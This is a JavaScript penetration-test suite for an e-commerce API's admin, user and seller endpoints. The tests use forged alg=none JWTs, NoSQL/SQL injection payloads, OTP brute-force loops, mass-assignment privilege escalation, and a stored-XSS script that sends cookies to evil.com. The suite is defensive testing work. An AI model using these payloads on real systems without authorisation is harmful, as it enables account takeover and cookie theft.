/**
 * VAPT Test Suite — Vulnerability Assessment & Penetration Testing
 */
const config = require("./config");
const t = require("./utils");

async function run(tokens = {}) {
  const { adminToken, userToken, sellerToken } = tokens;

  // ═══════════════════════════════════════════════════════
  //  VAPT-1: AUTHENTICATION & AUTHORIZATION
  // ═══════════════════════════════════════════════════════
  t.section("VAPT-1: AUTHENTICATION & AUTHORIZATION");

  // ── Broken Auth: No token on protected routes ──
  t.subsection("VAPT-1.1 Protected Routes Without Token");
  t.clearToken();

  const protectedRoutes = [
    { method: "GET", path: "/admin/getDetails" },
    { method: "GET", path: "/admin/users" },
    { method: "GET", path: "/admin/sellers" },
    { method: "GET", path: "/admin/products" },
    { method: "GET", path: "/admin/orders" },
    { method: "GET", path: "/admin/dashboard/stats" },
    { method: "GET", path: "/admin/categories" },
    { method: "GET", path: "/admin/banners" },
    { method: "GET", path: "/user/profile" },
    { method: "GET", path: "/user/address" },
    { method: "GET", path: "/user/cart" },
    { method: "GET", path: "/user/orders" },
    { method: "GET", path: "/seller/profile" },
    { method: "GET", path: "/seller/products" },
    { method: "GET", path: "/order/seller/orders" },
    { method: "GET", path: "/order/my-orders" },
  ];

  for (const route of protectedRoutes) {
    const res =
      route.method === "GET"
        ? await t.GET(route.path)
        : await t.POST(route.path, {});
    const rejected =
      res.data.code === 0 ||
      res.data.code === 3 ||
      res.status === 401 ||
      res.status === 403 ||
      res.data.message?.includes("invalid_token");
    t.assert(
      rejected,
      `No-token blocked: ${route.method} ${route.path}`,
      `code=${res.data.code}, status=${res.status}`,
    );
  }

  // ── Broken Auth: Fake/Tampered JWT ──
  t.subsection("VAPT-1.2 Tampered/Fake JWT Token");
  const fakeTokens = [
    "Bearer fake.token.here",
    "Bearer eyJhbGciOiJIUzI1NiJ9.eyJhZG1pbklkIjoiYWJjIiwiaXNBZG1pbiI6dHJ1ZX0.fakesig",
    "InvalidFormat",
    "",
    "Bearer ",
  ];

  for (const fakeToken of fakeTokens) {
    t.client.defaults.headers.common["Authorization"] = fakeToken;
    const res = await t.GET("/admin/getDetails");
    const rejected =
      res.data.code === 0 ||
      res.data.code === 3 ||
      res.status === 401 ||
      res.status === 403;
    t.assert(
      rejected,
      `Fake JWT rejected: "${fakeToken.substring(0, 30)}..."`,
      `code=${res.data.code}`,
    );
  }
  t.clearToken();

  // ── Cross-role access: User token on admin routes ──
  t.subsection("VAPT-1.3 Cross-Role Access (User Token → Admin Routes)");
  if (userToken) {
    t.setToken(userToken);
    const res = await t.GET("/admin/users");
    const rejected =
      res.data.code === 0 ||
      res.data.code === 3 ||
      res.status === 401 ||
      res.status === 403;
    t.assert(
      rejected,
      "User token rejected on admin route",
      `code=${res.data.code}`,
    );
  } else {
    t.warn("No user token — cannot test cross-role");
  }

  // ── Cross-role: Seller token on admin routes ──
  t.subsection("VAPT-1.4 Cross-Role Access (Seller Token → Admin Routes)");
  if (sellerToken) {
    t.setToken(sellerToken);
    const res = await t.GET("/admin/users");
    const rejected =
      res.data.code === 0 ||
      res.data.code === 3 ||
      res.status === 401 ||
      res.status === 403;
    t.assert(
      rejected,
      "Seller token rejected on admin route",
      `code=${res.data.code}`,
    );
  } else {
    t.warn("No seller token — cannot test cross-role");
  }

  // ── Unprotected admin coupon/offers routes ──
  t.subsection("VAPT-1.5 Unprotected Admin Routes (Coupon/Offers)");
  t.clearToken();

  const unprotectedAdminRoutes = [
    { method: "GET", path: "/coupon/admin/list" },
    {
      method: "POST",
      path: "/coupon/admin/create",
      body: { code: "TEST", discountType: "percentage", discount: 10 },
    },
    { method: "GET", path: "/offers/admin/list" },
    {
      method: "POST",
      path: "/offers/admin/create",
      body: { name: "TEST", type: "percentage", value: 10 },
    },
    { method: "GET", path: "/offers/admin/stats/overview" },
  ];

  for (const route of unprotectedAdminRoutes) {
    const res =
      route.method === "GET"
        ? await t.GET(route.path)
        : await t.POST(route.path, route.body);
    // These should require auth but currently don't
    if (res.status === 200 && res.data.code === 1) {
      t.warn(
        `UNPROTECTED admin route: ${route.method} ${route.path}`,
        "Missing auth middleware — CRITICAL",
      );
    } else {
      t.assert(true, `Admin route protected: ${route.method} ${route.path}`);
    }
  }

  // ── Admin register endpoint exposed? ──
  t.subsection("VAPT-1.6 Admin Register Endpoint Exposure");
  t.clearToken();
  const regRes = await t.POST("/admin/register", {
    email: "hacker@evil.com",
    password: "hacked123",
    name: "Hacker",
  });
  if (regRes.data.code === 1 && regRes.data.data?.admin) {
    t.warn(
      "CRITICAL: /admin/register is publicly accessible — anyone can create admin!",
      "Requires immediate fix",
    );
  } else {
    t.assert(
      true,
      "Admin register endpoint check done",
      `code=${regRes.data.code}`,
    );
  }

  // ═══════════════════════════════════════════════════════
  //  VAPT-2: INJECTION ATTACKS
  // ═══════════════════════════════════════════════════════
  t.section("VAPT-2: INJECTION ATTACKS");

  // ── SQL/NoSQL Injection on login ──
  t.subsection("VAPT-2.1 NoSQL Injection on Admin Login");
  for (const payload of config.NOSQL_INJECTION_PAYLOADS) {
    const res = await t.POST("/admin/login", {
      email: payload,
      password: payload,
    });
    const safe = res.status !== 500 && !res.data.data?.token;
    t.assert(
      safe,
      `NoSQL injection blocked: ${JSON.stringify(payload).substring(0, 40)}`,
      `status=${res.status}`,
    );
  }

  t.subsection("VAPT-2.2 SQL Injection Strings on Login");
  for (const payload of config.SQL_INJECTION_PAYLOADS) {
    const res = await t.POST("/admin/login", {
      email: payload,
      password: payload,
    });
    const safe = res.status !== 500;
    t.assert(
      safe,
      `SQL injection string handled: ${payload.substring(0, 30)}`,
      `status=${res.status}`,
    );
  }

  t.subsection("VAPT-2.3 NoSQL Injection on Auth OTP");
  const nosqlOtpRes = await t.POST("/auth/verifyOtp", {
    mobileNumber: config.USER_MOBILE,
    countryCode: config.USER_COUNTRY_CODE,
    otp: { $gt: "" },
  });
  const otpSafe =
    !nosqlOtpRes.data.data?.token ||
    nosqlOtpRes.status === 400 ||
    nosqlOtpRes.data.code === 0;
  t.assert(
    otpSafe,
    "NoSQL injection on OTP verify blocked",
    `code=${nosqlOtpRes.data.code}`,
  );

  // ── XSS in user input ──
  t.subsection("VAPT-2.4 XSS Payloads in User Input");
  if (userToken) {
    t.setToken(userToken);
    for (const xss of config.XSS_PAYLOADS.slice(0, 3)) {
      const res = await t.PUT("/user/profile", { fullName: xss });
      t.assert(
        res.status !== 500,
        `XSS in profile name doesn't crash: ${xss.substring(0, 25)}`,
      );

      // Check if it's stored and returned as-is (reflected XSS)
      const profile = await t.GET("/user/profile");
      if (
        profile.data.data?.user?.fullName === xss ||
        profile.data.data?.fullName === xss
      ) {
        t.warn(
          `Stored XSS: profile fullName stores raw HTML: ${xss.substring(0, 25)}`,
        );
      }
    }
  }

  // ── XSS in admin CMS ──
  t.subsection("VAPT-2.5 XSS in Admin CMS Pages");
  if (adminToken) {
    t.setToken(adminToken);
    const res = await t.POST("/admin/cms/terms", {
      termsAndConditions:
        "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
    });
    t.assert(res.status !== 500, "XSS in CMS doesn't crash server");
    // CMS may legitimately accept HTML, but script tags are dangerous
    if (res.data.code === 1) {
      t.warn(
        "CMS accepts <script> tags — potential stored XSS",
        "Sanitize HTML input",
      );
    }
  }

  // ── Path traversal ──
  t.subsection("VAPT-2.6 Path Traversal in ID Parameters");
  if (adminToken) {
    t.setToken(adminToken);
    for (const payload of config.PATH_TRAVERSAL_PAYLOADS) {
      const res = await t.GET(`/admin/users/${encodeURIComponent(payload)}`);
      t.assert(
        res.status !== 500,
        `Path traversal in param doesn't crash: ${payload.substring(0, 25)}`,
      );
    }
  }

  // ═══════════════════════════════════════════════════════
  //  VAPT-3: BROKEN OBJECT-LEVEL AUTHORIZATION (BOLA/IDOR)
  // ═══════════════════════════════════════════════════════
  t.section("VAPT-3: BOLA / IDOR CHECKS");

  t.subsection("VAPT-3.1 Access Other User's Profile via User Token");
  if (userToken) {
    t.setToken(userToken);
    // Try to access random userId profile (if endpoint supports it)
    const res = await t.GET("/user/profile", {
      userId: "000000000000000000000001",
    });
    // Should return OWN profile, not another user's
    t.assert(res.status !== 500, "IDOR on profile: doesn't crash");
    // This is a warning-level check since it depends on implementation
  }

  t.subsection("VAPT-3.2 Seller Access Other Seller's Products");
  if (sellerToken) {
    t.setToken(sellerToken);
    // Access a fake product ID
    const res = await t.GET("/seller/products/000000000000000000000001");
    t.assert(res.status !== 500, "IDOR on seller product: doesn't crash");
    if (res.data.code === 1 && res.data.data) {
      t.warn("Seller can access product not owned by them — potential IDOR");
    }
  }

  // ═══════════════════════════════════════════════════════
  //  VAPT-4: RATE LIMITING & BRUTE FORCE
  // ═══════════════════════════════════════════════════════
  t.section("VAPT-4: RATE LIMITING & BRUTE FORCE");

  t.subsection("VAPT-4.1 Brute Force Admin Login (20 rapid attempts)");
  t.clearToken();
  let bruteForceBlocked = false;
  for (let i = 0; i < 20; i++) {
    const res = await t.POST("/admin/login", {
      email: config.ADMIN_EMAIL,
      password: `wrong_${i}`,
    });
    if (res.status === 429 || res.status === 403) {
      bruteForceBlocked = true;
      t.assert(true, `Rate limiting kicked in after ${i + 1} attempts`);
      break;
    }
  }
  if (!bruteForceBlocked) {
    t.warn(
      "No rate limiting on admin login — brute force possible",
      "Add rate limiting middleware",
    );
  }

  t.subsection("VAPT-4.2 Brute Force OTP (20 rapid attempts)");
  let otpBruteBlocked = false;
  for (let i = 0; i < 20; i++) {
    const res = await t.POST("/auth/verifyOtp", {
      mobileNumber: config.USER_MOBILE,
      countryCode: config.USER_COUNTRY_CODE,
      otp: String(100000 + i),
    });
    if (res.status === 429 || res.status === 403) {
      otpBruteBlocked = true;
      t.assert(true, `OTP rate limiting after ${i + 1} attempts`);
      break;
    }
  }
  if (!otpBruteBlocked) {
    t.warn(
      "No rate limiting on OTP verification — brute force possible",
      "Add rate limiting",
    );
  }

  // ═══════════════════════════════════════════════════════
  //  VAPT-5: INPUT VALIDATION & DATA INTEGRITY
  // ═══════════════════════════════════════════════════════
  t.section("VAPT-5: INPUT VALIDATION");

  t.subsection("VAPT-5.1 Oversized Payload on Login");
  const bigRes = await t.POST("/admin/login", {
    email: "A".repeat(10000) + "@test.com",
    password: "B".repeat(10000),
  });
  t.assert(
    bigRes.status !== 500,
    "Huge payload doesn't crash server",
    `status=${bigRes.status}`,
  );

  t.subsection("VAPT-5.2 Invalid Data Types");
  const typeRes = await t.POST("/admin/login", {
    email: 12345,
    password: { nested: true },
  });
  t.assert(
    typeRes.status !== 500,
    "Wrong types don't crash server",
    `status=${typeRes.status}`,
  );

  t.subsection("VAPT-5.3 Special Characters in Fields");
  const specialRes = await t.POST("/admin/login", {
    email: "test@test.com\0\r\nX-Injected: true",
    password: "test\0\r\n",
  });
  t.assert(specialRes.status !== 500, "Null bytes/CRLF don't crash server");

  t.subsection("VAPT-5.4 Invalid MongoDB ObjectID");
  if (adminToken) {
    t.setToken(adminToken);
    const invalidIds = [
      "not-an-id",
      "123",
      "'; DROP TABLE;--",
      "<script>alert(1)</script>",
      "undefined",
      "null",
    ];
    for (const id of invalidIds) {
      const res = await t.GET(`/admin/users/${id}`);
      t.assert(
        res.status !== 500,
        `Invalid ObjectID "${id}" doesn't crash`,
        `status=${res.status}`,
      );
    }
  }

  // ═══════════════════════════════════════════════════════
  //  VAPT-6: SECURITY HEADERS & CONFIGURATION
  // ═══════════════════════════════════════════════════════
  t.section("VAPT-6: SECURITY HEADERS & CONFIGURATION");

  t.subsection("VAPT-6.1 Security Headers Check");
  t.clearToken();
  const headersRes = await t.GET("/offers/home");
  const headers = headersRes.headers;

  const securityHeaders = {
    "x-content-type-options": "nosniff",
    "x-frame-options": "DENY",
    "strict-transport-security": null, // any value
    "x-xss-protection": null,
    "content-security-policy": null,
  };

  for (const [header, expectedVal] of Object.entries(securityHeaders)) {
    const val = headers[header];
    if (!val) {
      t.warn(`Missing security header: ${header}`);
    } else {
      t.assert(true, `Security header present: ${header}=${val}`);
    }
  }

  t.subsection("VAPT-6.2 CORS Check");
  const corsCheck = headers["access-control-allow-origin"];
  if (corsCheck === "*") {
    t.warn("CORS allows all origins (*) — restrict in production");
  } else if (corsCheck) {
    t.assert(true, `CORS origin restricted: ${corsCheck}`);
  } else {
    t.assert(true, "No CORS header (default same-origin)");
  }

  t.subsection("VAPT-6.3 Server Information Disclosure");
  const serverHeader = headers["x-powered-by"];
  if (serverHeader) {
    t.warn(
      `Server discloses technology: x-powered-by=${serverHeader}`,
      'Use app.disable("x-powered-by")',
    );
  } else {
    t.assert(true, "x-powered-by header not exposed");
  }

  // ═══════════════════════════════════════════════════════
  //  VAPT-7: JWT VULNERABILITIES
  // ═══════════════════════════════════════════════════════
  t.section("VAPT-7: JWT VULNERABILITIES");

  t.subsection("VAPT-7.1 JWT with 'none' Algorithm");
  // Craft a JWT with algorithm=none
  const headerB64 = Buffer.from(
    JSON.stringify({ alg: "none", typ: "JWT" }),
  ).toString("base64url");
  const payloadB64 = Buffer.from(
    JSON.stringify({ adminId: "000000000000000000000001", isAdmin: true }),
  ).toString("base64url");
  const noneToken = `${headerB64}.${payloadB64}.`;
  t.client.defaults.headers.common["Authorization"] = `Bearer ${noneToken}`;
  const noneRes = await t.GET("/admin/getDetails");
  const noneRejected =
    noneRes.data.code === 0 ||
    noneRes.data.code === 3 ||
    noneRes.status === 401;
  t.assert(
    noneRejected,
    "JWT with alg=none rejected",
    `code=${noneRes.data.code}`,
  );

  t.subsection("VAPT-7.2 Expired JWT Simulation");
  // Can't easily craft expired JWT without the secret, but test with garbage
  t.client.defaults.headers.common["Authorization"] =
    "Bearer eyJhbGciOiJIUzI1NiJ9.eyJhZG1pbklkIjoiNjk1MmMxYzc5MWEzNTdmMWZiNGQ0YzcxIiwiaXNBZG1pbiI6dHJ1ZSwiZXhwIjoxfQ.invalidsig";
  const expRes = await t.GET("/admin/getDetails");
  t.assert(
    expRes.data.code === 0 || expRes.data.code === 3,
    "Expired/invalid JWT rejected",
  );
  t.clearToken();

  // ═══════════════════════════════════════════════════════
  //  VAPT-8: MASS ASSIGNMENT / PRIVILEGE ESCALATION
  // ═══════════════════════════════════════════════════════
  t.section("VAPT-8: MASS ASSIGNMENT / PRIVILEGE ESCALATION");

  t.subsection("VAPT-8.1 Mass Assignment on User Profile");
  if (userToken) {
    t.setToken(userToken);
    const massRes = await t.PUT("/user/profile", {
      fullName: "Normal User",
      isAdmin: true,
      role: "admin",
      isActive: true,
      _id: "000000000000000000000001",
    });
    t.assert(massRes.status !== 500, "Mass assignment doesn't crash");
    // Verify user didn't become admin
    const check = await t.GET("/user/profile");
    const userData = check.data.data?.user || check.data.data;
    if (userData?.isAdmin === true || userData?.role === "admin") {
      t.warn(
        "CRITICAL: Mass assignment allows privilege escalation!",
        "Filter input fields",
      );
    } else {
      t.assert(true, "Mass assignment on profile doesn't escalate privileges");
    }
  }

  t.subsection("VAPT-8.2 Mass Assignment on Seller Profile");
  if (sellerToken) {
    t.setToken(sellerToken);
    const massRes = await t.PUT("/seller/profile", {
      shopName: "Normal Shop",
      isVerified: true,
      isApproved: true,
      adminApproved: true,
      kycVerified: true,
    });
    t.assert(massRes.status !== 500, "Seller mass assignment doesn't crash");
  }

  // ═══════════════════════════════════════════════════════
  //  VAPT-9: BUSINESS LOGIC VULNERABILITIES
  // ═══════════════════════════════════════════════════════
  t.section("VAPT-9: BUSINESS LOGIC VULNERABILITIES");

  t.subsection("VAPT-9.1 Negative Price / Quantity");
  if (sellerToken) {
    t.setToken(sellerToken);
    const negRes = await t.POST("/seller/products", {
      productName: "Negative Price Product",
      price: -100,
      mrp: -200,
      stock: -50,
      categoryId: "000000000000000000000000",
    });
    if (negRes.data.code === 1) {
      t.warn("Product created with negative price/stock — needs validation");
    } else {
      t.assert(true, "Negative price/stock rejected");
    }
  }

  t.subsection("VAPT-9.2 Zero / Extreme Price");
  if (sellerToken) {
    t.setToken(sellerToken);
    let res = await t.POST("/seller/products", {
      productName: "Zero Price",
      price: 0,
      mrp: 0,
      stock: 0,
      categoryId: "000000000000000000000000",
    });
    t.assert(res.status !== 500, "Zero price doesn't crash");

    res = await t.POST("/seller/products", {
      productName: "Max Price",
      price: Number.MAX_SAFE_INTEGER,
      mrp: Number.MAX_SAFE_INTEGER,
      stock: Number.MAX_SAFE_INTEGER,
      categoryId: "000000000000000000000000",
    });
    t.assert(res.status !== 500, "Extreme price doesn't crash");
  }

  t.subsection("VAPT-9.3 OTP Bypass Check (hardcoded OTP)");
  t.clearToken();
  // Test if hardcoded OTP "123456" works
  const hardcodeRes = await t.POST("/auth/verifyOtp", {
    mobileNumber: "9000000001", // Random number
    countryCode: "+91",
    otp: "123456",
  });
  if (hardcodeRes.data.data?.token) {
    t.warn("CRITICAL: Hardcoded OTP '123456' works — bypass vulnerability!");
  } else {
    t.assert(true, "Hardcoded OTP '123456' does not bypass");
  }

  // Also test the MASTER_OTP (from env) on a random number
  t.subsection("VAPT-9.4 Master OTP on Random Number");
  // First, need to initiate login for the random number
  await t.POST("/auth/login", {
    mobileNumber: "9000000001",
    countryCode: "+91",
  });
  const masterRes = await t.POST("/auth/verifyOtp", {
    mobileNumber: "9000000001",
    countryCode: "+91",
    otp: config.MASTER_OTP,
  });
  if (masterRes.data.data?.token) {
    t.warn(
      "Master OTP works for any number — ensure this is dev-only!",
      "Disable MASTER_OTP in production",
    );
  } else {
    t.assert(true, "Master OTP check completed");
  }

  // ═══════════════════════════════════════════════════════
  //  VAPT-10: ERROR HANDLING & INFORMATION DISCLOSURE
  // ═══════════════════════════════════════════════════════
  t.section("VAPT-10: ERROR HANDLING & INFO DISCLOSURE");

  t.subsection("VAPT-10.1 Stack Trace Exposure");
  t.clearToken();
  const errorRoutes = [
    "/admin/users/invalidObjectId!@#",
    "/nonexistent/route",
    "/admin/categories/%%%",
  ];

  for (const route of errorRoutes) {
    const res = await t.GET(route);
    const body = JSON.stringify(res.data);
    const exposesStack = body.includes("at ") && body.includes(".js:");
    if (exposesStack) {
      t.warn(`Stack trace exposed on ${route}`, "Hide errors in production");
    } else {
      t.assert(true, `No stack trace exposed on ${route}`);
    }
  }

  t.subsection("VAPT-10.2 Verbose Error Messages");
  const verboseRes = await t.POST("/admin/login", { email: "x" });
  const msg = JSON.stringify(verboseRes.data);
  const leaksInternal =
    msg.includes("MongoError") ||
    msg.includes("ValidationError") ||
    msg.includes("TypeError") ||
    msg.includes("ReferenceError");
  if (leaksInternal) {
    t.warn(
      "Internal error details leaked in response",
      JSON.stringify(verboseRes.data).substring(0, 100),
    );
  } else {
    t.assert(true, "No internal error details in login response");
  }

  // ═══════════════════════════════════════════════════════
  //  VAPT-11: HTTP METHOD TAMPERING
  // ═══════════════════════════════════════════════════════
  t.section("VAPT-11: HTTP METHOD TAMPERING");

  t.subsection("VAPT-11.1 Wrong HTTP Methods");
  const methodTests = [
    { path: "/admin/login", expected: "POST", try: "GET" },
    { path: "/admin/login", expected: "POST", try: "DELETE" },
    { path: "/admin/users", expected: "GET", try: "DELETE" },
    { path: "/admin/getDetails", expected: "GET", try: "POST" },
  ];

  if (adminToken) t.setToken(adminToken);
  for (const test of methodTests) {
    let res;
    switch (test.try) {
      case "GET":
        res = await t.GET(test.path);
        break;
      case "POST":
        res = await t.POST(test.path, {});
        break;
      case "PUT":
        res = await t.PUT(test.path, {});
        break;
      case "DELETE":
        res = await t.DELETE(test.path);
        break;
      case "PATCH":
        res = await t.PATCH(test.path, {});
        break;
    }
    t.assert(
      res.status !== 500,
      `${test.try} ${test.path} (expected ${test.expected}) doesn't crash`,
      `status=${res.status}`,
    );
  }

  // ═══════════════════════════════════════════════════════
  //  VAPT-12: DENIAL OF SERVICE (DoS) CHECKS
  // ═══════════════════════════════════════════════════════
  t.section("VAPT-12: DENIAL OF SERVICE CHECKS");

  t.subsection("VAPT-12.1 Large JSON Body");
  t.clearToken();
  try {
    const largeRes = await t.POST("/admin/login", {
      email: "A".repeat(100000),
      password: "B".repeat(100000),
    });
    t.assert(
      largeRes.status === 413 || largeRes.status < 500,
      "Large body handled",
      `status=${largeRes.status}`,
    );
  } catch (e) {
    t.assert(true, "Large body rejected (connection error)");
  }

  t.subsection("VAPT-12.2 Deeply Nested JSON");
  let deepObj = { a: "test" };
  for (let i = 0; i < 50; i++) {
    deepObj = { nested: deepObj };
  }
  try {
    const deepRes = await t.POST("/admin/login", deepObj);
    t.assert(
      deepRes.status !== 500,
      "Deeply nested JSON doesn't crash",
      `status=${deepRes.status}`,
    );
  } catch (e) {
    t.assert(true, "Deeply nested JSON rejected");
  }
}

module.exports = { run };
